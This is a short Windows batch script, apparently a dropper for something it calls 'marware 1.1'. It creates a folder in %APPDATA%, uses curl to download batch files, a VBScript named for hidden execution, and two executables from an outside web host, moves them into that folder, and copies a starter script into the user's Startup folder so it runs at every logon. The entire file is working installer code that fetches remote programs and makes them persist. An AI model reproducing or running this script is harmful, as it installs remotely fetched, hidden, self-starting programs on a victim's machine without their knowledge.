mkdir "%APPDATA%\marware1.1"

curl -O http://harimtim.de/marware/1.1/image1.txt
curl -O http://harimtim.de/marware/1.1/image2.txt
curl -O http://harimtim.de/marware/1.1/icon.ico
curl -O http://harimtim.de/marware/1.1/main.bat
curl -O http://harimtim.de/marware/1.1/matrix.bat
curl -O http://harimtim.de/marware/1.1/show1.bat
curl -O http://harimtim.de/marware/1.1/show2.bat
curl -O http://harimtim.de/marware/1.1/run_main_hidden.vbs
curl -O http://harimtim.de/marware/1.1/main.exe
curl -O http://harimtim.de/marware/1.1/autostart.bat
curl -O http://harimtim.de/marware/1.1/starter.bat
curl -O http://harimtim.de/marware/1.1/input_left.txt
curl -O http://harimtim.de/marware/1.1/mail.exe
curl -O http://harimtim.de/marware/1.1/email.ico

move starter.bat "%APPDATA%\marware1.1"
move email.ico "%APPDATA%\marware1.1"
move input_left.txt "%APPDATA%\marware1.1"
move icon.ico "%APPDATA%\marware1.1"
move show1.bat "%APPDATA%\marware1.1"
move show2.bat "%APPDATA%\marware1.1"
move main.bat "%APPDATA%\marware1.1"
move matrix.bat "%APPDATA%\marware1.1"
move main.exe "%APPDATA%\marware1.1"
move image1.txt "%APPDATA%\marware1.1"
move image2.txt "%APPDATA%\marware1.1"
move run_main_hidden.vbs "%APPDATA%\marware1.1"
move mail.exe "%APPDATA%\marware1.1"
move autostart.bat "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"


exit
